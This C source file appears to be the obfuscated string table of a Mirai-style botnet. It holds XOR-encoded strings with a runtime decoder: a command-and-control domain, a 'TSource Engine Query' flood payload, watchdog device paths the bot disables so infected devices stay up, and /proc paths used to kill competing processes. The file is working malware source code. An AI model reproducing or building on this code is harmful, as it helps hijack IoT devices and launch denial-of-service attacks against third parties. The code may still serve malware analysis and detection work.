#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeaddaad;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {
    add_entry(TABLE_CNC_DOMAIN, "\x72\x6D\x76\x70\x71\x61\x6C\x71\x66\x2A\x6B\x6A\x61\x04", 14); // domain
    add_entry(TABLE_ATK_VSE, "\x50\x57\x6B\x71\x76\x67\x61\x24\x41\x6A\x63\x6D\x6A\x61\x24\x55\x71\x61\x76\x7D\x04", 21); // TSource Engine Query

    add_entry(TABLE_WATCHDOG_1, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /dev/watchdog
    add_entry(TABLE_WATCHDOG_2, "\x2B\x60\x61\x72\x2B\x69\x6D\x77\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 19); // /dev/misc/watchdog
    add_entry(TABLE_WATCHDOG_3, "\x2B\x77\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 15); // /sbin/watchdog
    add_entry(TABLE_WATCHDOG_4, "\x2B\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /bin/watchdog
    add_entry(TABLE_WATCHDOG_5, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x5B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_WATCHDOG_6, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101/watchdog
    add_entry(TABLE_WATCHDOG_7, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x34\x04", 15); // /dev/watchdog0
    add_entry(TABLE_WATCHDOG_8, "\x2B\x61\x70\x67\x2B\x60\x61\x62\x65\x71\x68\x70\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 22); // /etc/default/watchdog
    add_entry(TABLE_WATCHDOG_9, "\x2B\x61\x70\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /etc/watchdog
    // Single instance
    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
